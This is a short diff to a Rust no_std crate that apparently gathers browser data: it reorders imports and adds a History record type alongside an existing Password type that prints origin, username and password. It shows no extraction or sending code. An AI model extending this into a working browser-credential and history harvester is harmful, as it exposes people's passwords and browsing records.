@@ -1,16 +1,16 @@
 #![no_std]
 
+extern crate alloc;
 mod chromium;
 
-use alloc::string::String;
 use crate::alloc::borrow::ToOwned;
-extern crate alloc;
+use alloc::string::String;
 
+use crate::chromium::ChromiumTask;
 use alloc::vec;
 use core::fmt::{Display, Formatter};
 use tasks::Task;
 use tasks::{composite_task, impl_composite_task_runner, CompositeTask};
-use crate::chromium::ChromiumTask;
 
 pub struct BrowsersTask {
     inner: CompositeTask
@@ -137,6 +137,25 @@ impl Display for Password {
             self.origin.as_deref().unwrap_or_default(),
             self.username.as_deref().unwrap_or_default(),
             self.password.as_deref().unwrap_or_default()
+        )
+    }
+}
+
+#[derive(PartialEq, Ord, Eq, PartialOrd)]
+pub(crate) struct History {
+    pub url: String,
+    pub title: String,
+    pub last_visit_time: i64
+}
+
+impl Display for History {
+    fn fmt(&self, f: &mut Formatter<'_>) -> core::fmt::Result {
+        write!(
+            f,
+            "Title: {}\n\
+            Url: {}\n",
+            self.title,
+            self.url,
         )
     }
 }
